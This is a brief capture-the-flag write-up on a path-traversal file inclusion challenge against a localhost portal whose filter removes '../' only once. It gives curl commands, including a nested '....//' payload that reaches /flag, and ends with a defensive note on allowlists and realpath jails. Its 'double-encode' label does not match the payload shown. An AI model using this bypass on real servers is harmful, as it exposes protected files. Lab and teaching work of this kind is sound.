### Hostel LFI - One Strip Is Not Enough

Room portal on `http://127.0.0.1:80/?page=home.txt`. Filter does `page.replace("../","")` **once**. That is the bug.

```bash
curl "http://127.0.0.1:80/?page=home.txt"
curl "http://127.0.0.1:80/?page=../../../../flag"
curl "http://127.0.0.1:80/?page=....//....//....//....//flag"
```

Read `/challenge/app.py` - the filter is visible. `....//` becomes `../` after one strip. Server runs as root so `/flag` is readable through traversal.

Solve: double-encode bypass. Talk: blocklist vs allowlist, `realpath` + jail.
